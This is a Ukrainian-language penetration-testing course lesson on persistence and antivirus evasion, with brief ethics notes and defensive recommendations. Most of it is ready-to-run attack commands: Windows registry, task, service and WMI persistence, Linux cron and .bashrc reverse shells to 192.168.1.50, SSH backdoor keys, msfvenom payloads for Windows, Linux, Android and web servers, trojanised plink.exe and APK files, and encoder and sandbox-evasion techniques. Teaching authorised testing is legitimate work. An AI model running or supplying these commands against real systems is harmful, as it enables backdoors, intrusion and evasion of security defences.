Утримання доступу (Persistence) та обхід антивірусів

2 год Нова

10.1 Вступ до Persistence

Persistence (утримання доступу, закріплення) — техніки, що дозволяють зберегти доступ до скомпрометованої системи після перезавантаження, зміни паролів або інших подій, які зазвичай переривають з'єднання. У MITRE ATT&CK це тактика TA0003 — Persistence.

Під час пентесту persistence важлива з двох причин: по-перше, втрата доступу означає необхідність повторної експлуатації (що може бути помічено); по-друге, persistence демонструє клієнту, наскільки глибоко зловмисник може закріпитися у системі.

Класифікація методів Persistence

Критерій Тип Опис Приклад
Привілеї User-level Працює з правами звичайного користувача Startup folder, HKCU Run
Admin/SYSTEM Потрібні адміністраторські привілеї Services, HKLM Run, WMI
Видимість Явна (noisy) Легко виявити стандартними інструментами Новий сервіс, scheduled task
Прихована (stealthy) Складно виявити без спеціалізованих інструментів WMI subscription, COM hijacking
Тригер Boot/logon Запускається при завантаженні або вході Run keys, Startup, services
Event-based Запускається при певній події WMI event, file change

Етичні аспекти

  • Документувати все — кожний механізм persistence повинен бути записаний зі шляхами та параметрами
  • Очищення (cleanup) — після пентесту обов'язково видалити всі backdoor'и
  • Мінімальний вплив — не порушувати роботу продакшн-систем
  • Scope — persistence повинна бути дозволена у Rules of Engagement

10.2 Windows Persistence

Registry Run Keys (T1547.001)

Найпростіший та найпоширеніший метод. Програми, прописані у Run keys, автоматично запускаються при кожному вході користувача або завантаженні системи.

# User-level (не потрібні адмін-привілеї)
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

# System-level (потрібні адмін-привілеї)
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

# Meterpreter — автоматична persistence через реєстр
meterpreter> run persistence -U -i 30 -p 4444 -r 192.168.1.50
# -U = user-level, -i = interval (секунди), -p = порт, -r = host

# Або через post-модуль
meterpreter> run post/windows/manage/persistence_exe \
  REXEPATH=/tmp/payload.exe \
  STARTUP=USER

# Ручне додавання через reg
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Users\Public\update.exe" /f

Scheduled Tasks (T1053.005)

# Створення задачі, що запускається щохвилини
schtasks /create /tn "SystemHealthCheck" /tr "C:\Users\Public\health.exe" /sc minute /mo 5 /ru SYSTEM

# Задача при логіні
schtasks /create /tn "UserSync" /tr "powershell -w hidden -ep bypass -f C:\Users\Public\sync.ps1" /sc onlogon

# Задача при завантаженні
schtasks /create /tn "NetDiag" /tr "C:\Windows\Temp\diag.exe" /sc onstart /ru SYSTEM

# Meterpreter post-модуль
meterpreter> run post/windows/manage/persistence_exe \
  REXEPATH=/tmp/payload.exe \
  STARTUP=TASK

# Перегляд задач
schtasks /query /fo LIST /v | findstr /i "taskname next status"

# Видалення (cleanup)
schtasks /delete /tn "SystemHealthCheck" /f

Windows Services (T1543.003)

# Створення сервісу (потрібні адмін-привілеї)
sc create "WindowsNetDiag" binpath= "C:\Windows\Temp\svc.exe" start= auto obj= "LocalSystem" DisplayName= "Windows Network Diagnostics"

# Запуск
sc start WindowsNetDiag

# Meterpreter — persistence через сервіс
meterpreter> run post/windows/manage/persistence_exe \
  REXEPATH=/tmp/payload.exe \
  STARTUP=SERVICE

# Видалення (cleanup)
sc stop WindowsNetDiag
sc delete WindowsNetDiag

Startup Folder (T1547.001)

# User-level (поточний користувач)
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\

# System-level (всі користувачі)
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\

# Скопіювати payload
copy C:\Windows\Temp\payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsHelper.exe"

WMI Event Subscription (T1546.003)

Один із найскладніших для виявлення методів. WMI (Windows Management Instrumentation) дозволяє підписатися на системні події та виконати дію при їх виникненні.

# PowerShell — створення WMI persistence
# Тригер: кожні 60 секунд
$Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
  Name = "CoreHealthFilter";
  EventNamespace = "root\cimv2";
  QueryLanguage = "WQL";
  Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
  Name = "CoreHealthConsumer";
  CommandLineTemplate = "C:\Windows\Temp\health.exe"
}

Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
  Filter = $Filter;
  Consumer = $Consumer
}

# Meterpreter
meterpreter> run post/windows/manage/wmi_persistence \
  PAYLOAD_PATH=C:\\Windows\\Temp\\payload.exe \
  EVENT_ID_TRIGGER=4625

10.3 Linux Persistence

Cron Jobs (T1053.003)

# User-level cron (не потрібен root)
crontab -e
# Додати рядок — кожні 5 хвилин
*/5 * * * * /tmp/.hidden/beacon.sh

# System-level cron
echo "*/5 * * * * root /opt/.update/check.sh" >> /etc/crontab

# Або через /etc/cron.d/
echo "*/10 * * * * root bash -c 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'" > /etc/cron.d/system-check

# Meterpreter
meterpreter> run post/linux/manage/cron_persistence \
  REMOTE_HOST=192.168.1.50 \
  REMOTE_PORT=4444

Shell Profile Scripts (T1546.004)

# Виконується при кожному логіні користувача
echo 'nohup bash -c "bash -i >& /dev/tcp/192.168.1.50/4444 0>&1" &' >> ~/.bashrc

# Або в .bash_profile (при login shell)
echo '/tmp/.hidden/connect.sh &' >> ~/.bash_profile

# Для всіх користувачів (root)
echo '/opt/.system/beacon.sh &' >> /etc/profile
echo '/opt/.system/beacon.sh &' >> /etc/bash.bashrc

SSH Authorized Keys (T1098.004)

# Генерація ключа на атакуючій машині
ssh-keygen -t ed25519 -f /tmp/backdoor_key -N ""

# Додавання публічного ключа до authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... backdoor" >> /root/.ssh/authorized_keys
# або
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... backdoor" >> /home/user/.ssh/authorized_keys

# Тепер вхід без паролю:
ssh -i /tmp/backdoor_key user@target

# Приховування: встановити правильні permissions
chmod 600 /home/user/.ssh/authorized_keys
chmod 700 /home/user/.ssh/

Systemd Service (T1543.002)

# Створення сервісу (потрібен root)
cat > /etc/systemd/system/system-health.service << 'EOF'
[Unit]
Description=System Health Monitor
After=network.target

[Service]
Type=simple
ExecStart=/opt/.system/health-monitor
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

# Активація
systemctl daemon-reload
systemctl enable system-health.service
systemctl start system-health.service

# Перевірка
systemctl status system-health.service

10.4 msfvenom: створення payload'ів

msfvenom — утиліта Metasploit для генерації payload'ів у різних форматах. Замінила попередні інструменти msfpayload та msfencode. Дозволяє створювати standalone executables, shellcode, скрипти для різних платформ.

Синтаксис msfvenom

msfvenom -p <payload> [options] -f <format> -o <output>

# Основні параметри:
-p    Payload (наприклад, windows/meterpreter/reverse_tcp)
-f    Формат виводу (exe, elf, apk, raw, python, c, ps1...)
-o    Вихідний файл
-e    Encoder (наприклад, x86/shikata_ga_nai)
-i    Кількість ітерацій кодування
-b    Bad characters (символи, яких уникати: \x00\x0a\x0d)
-x    Шаблон (легітимний exe для вбудовування payload)
-k    Зберегти поведінку шаблону (payload у окремому потоці)
-n    NOP sled розмір
-a    Архітектура (x86, x64)
--platform    Платформа (windows, linux, android)

Staged vs Stageless

Характеристика Staged (meterpreter/reverse_tcp) Stageless (meterpreter_reverse_tcp)
Розмір Малий stager (~5 KB) Великий (~200 KB+)
Мережа Stager завантажує stage по мережі Весь payload в одному файлі
Надійність Залежить від стабільного з'єднання Працює навіть при нестабільній мережі
Детектування Мережевий трафік виглядає підозріло Один файл — легше детектувати на диску
Позначення payload/handler (slash) payload_handler (underscore)

10.5 msfvenom: практика з Multi/Handler

Генерація payload'ів для різних платформ

Windows EXE (Reverse TCP):

# Staged
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe

# Stageless
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload_stageless.exe

# x64
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload64.exe

# HTTPS (обходить firewall)
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 -f exe -o payload_https.exe

Linux ELF:

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o payload.elf
chmod +x payload.elf

# x64
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o payload64.elf

Android APK:

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o evil.apk

# З вбудовуванням у легітимний APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -x legitimate.apk -o trojan.apk

Web payload'и:

# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# JSP (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py

Shellcode (для вбудовування):

# C format
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f c -b '\x00'

# Python format
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f python

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f ps1

Вбудовування у легітимний файл (Template Injection)

# Вбудовування payload у легітимний exe
# -x = шаблон, -k = зберегти оригінальну поведінку
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
  -x /usr/share/windows-binaries/plink.exe \
  -k -f exe -o plink_trojan.exe

# Результат: файл виглядає та працює як plink.exe,
# але паралельно встановлює зворотне з'єднання

10.6 Як працюють антивіруси

Розуміння механізмів роботи антивірусів (AV) та систем Endpoint Detection and Response (EDR) — ключ до ефективного пентесту. Сучасний захист використовує багаторівневий підхід.

Рівні захисту

Рівень Метод Коли працює Ефективність
1. Signature-based Порівняння з базою відомих сигнатур (хешів, byte patterns) При скануванні файлу на диску Висока для відомого malware, 0% для нового
2. Heuristic Аналіз структури файлу на підозрілі патерни (packers, entropy) При скануванні файлу Середня, багато false positives
3. Behavioral Моніторинг поведінки: ін'єкції, мережеві з'єднання, реєстр Під час виконання Висока, складно обійти
4. Sandbox Виконання у ізольованому середовищі для аналізу Перед доставкою / при відкритті Висока, але може бути виявлена
5. Cloud / ML Хмарний аналіз, машинне навчання Постійно (потрібен інтернет) Висока для zero-day
6. AMSI Antimalware Scan Interface — перехоплення скриптів PowerShell, VBScript, JScript, .NET Висока для скриптових атак

Signature-based Detection

Антивірус обчислює хеш файлу (MD5, SHA256) та порівнює з базою відомих загроз. Також шукає byte patterns (послідовності байтів), характерні для malware:

# YARA rule — приклад сигнатури
rule Meterpreter_Reverse_TCP {
    meta:
        description = "Detects Meterpreter reverse TCP payload"
    strings:
        $s1 = { 6a 00 53 53 53 53 53 53 68 }  // socket creation pattern
        $s2 = { fc e8 82 00 00 00 }             // typical shellcode start
        $s3 = "metsrv"                           // Meterpreter string
    condition:
        any of them
}

AMSI (Antimalware Scan Interface)

AMSI — інтерфейс Windows 10+, що дозволяє антивірусу сканувати вміст скриптів перед виконанням, навіть якщо вони обфусковані:

# Ланцюжок AMSI:
# PowerShell → amsi.dll → AmsiScanBuffer() → Defender → Block/Allow

# Приклад: навіть base64-закодований скрипт
# буде декодований PowerShell'ом і переданий AMSI
# ДО фактичного виконання

# AMSI бачить "фінальний" код незалежно від
# кількості шарів обфускації

EDR (Endpoint Detection and Response)

EDR — наступне покоління захисту, що йде далі за класичний AV:

Можливість Опис
Process telemetry Збір інформації про всі процеси, DLL, мережеві з'єднання
API hooking Перехоплення системних викликів (NtWriteVirtualMemory, CreateRemoteThread)
Memory scanning Сканування пам'яті процесів на відомі payload'и
Threat hunting Проактивний пошук загроз аналітиками SOC
Response Автоматична ізоляція хоста, kill процесу, rollback

Популярні EDR: CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne, Carbon Black, Elastic EDR, Wazuh (OSS).

10.7 Обхід антивірусів (Evasion)

Evasion — техніки обходу захисного ПЗ. MITRE ATT&CK: TA0005 — Defense Evasion. Розуміння цих технік необхідне пентестеру для демонстрації реалістичних сценаріїв атак.

Encoders (кодування payload)

Encoders змінюють binary pattern payload'у, зберігаючи функціональність. Це найпростіший (і найменш ефективний проти сучасних AV) метод evasion.

# shikata_ga_nai — polymorphic XOR encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -f exe -o encoded_payload.exe

# Кілька encoders послідовно
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
  -e x86/shikata_ga_nai -i 3 \
  -e x86/countdown -i 2 \
  -f exe -o multi_encoded.exe

# Уникнення bad characters
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
  -b '\x00\x0a\x0d' -f exe -o no_nulls.exe

# УВАГА: encoders самі по собі НЕ достатні для обходу
# сучасних AV. Вони змінюють сигнатуру, але stub декодера
# сам стає новою сигнатурою.

Packers та Crypters

Packer — стискає executable та розпаковує в пам'яті при запуску. Crypter — шифрує payload, stub дешифрує та запускає в пам'яті.

Інструмент Тип Опис
UPX Packer (OSS) Стиснення exe. Виявляється всіма AV через відомий stub
Themida Protector Комерційний. Anti-debug, VM detection, code obfuscation

Sandbox Evasion

Техніки виявлення sandbox-середовища для уникнення аналізу:

  • Timing checks — sandbox прискорює час; Sleep(300000) у sandbox пройде за секунди
  • User interaction — перевірка руху миші, натискань клавіш
  • Hardware checks — кількість CPU < 2, RAM < 2GB, disk < 60GB → ймовірно sandbox
  • VM detection — VMware Tools, VirtualBox Guest Additions, MAC-адреси
  • Domain check — payload працює тільки в цільовому домені
  • Process check — шукає wireshark.exe, procmon.exe, ollydbg.exe

Рекомендації з захисту

  • EDR — розгорнути сучасний EDR з behavioral detection
  • Application Whitelisting — дозволяти тільки підписані додатки (AppLocker, WDAC)
  • PowerShell Constrained Language Mode — обмеження можливостей PowerShell
  • Sysmon + SIEM — розширене логування та кореляція подій
  • AMSI — увімкнути та підтримувати оновленим
  • Credential Guard — захист LSASS від дампінгу (Windows 10+)
  • Мінімальні привілеї — не працювати з правами адміністратора
  • Network segmentation — обмеження lateral movement
  • Periodic audits — регулярна перевірка Autoruns, scheduled tasks, services
